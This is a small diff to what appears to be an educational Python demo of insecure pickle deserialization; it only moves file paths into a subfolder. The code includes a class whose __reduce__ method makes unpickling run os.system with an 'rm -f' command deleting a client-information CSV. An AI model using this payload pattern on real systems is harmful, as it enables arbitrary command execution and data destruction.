@@ -3,7 +3,7 @@ import pickle
 
 
 def serialize_exploit(user_input):
-    f = open("examples/insecure_deserialization/demo.pickle", "wb")
+    f = open("examples/insecure_deserialization/pickle_example/demo.pickle", "wb")
     pickle.dump(user_input, f)
 
 
@@ -15,7 +15,7 @@ serialize_exploit(user_input)
 # Not-safe input
 class DeleteClientInfo():
     def __reduce__(self):
-        command = "rm -f examples/insecure_deserialization/important_client_information.csv"
+        command = "rm -f examples/insecure_deserialization/pickle_example/important_client_information.csv"
         return(os.system, (command,))
 
 serialize_exploit(DeleteClientInfo())
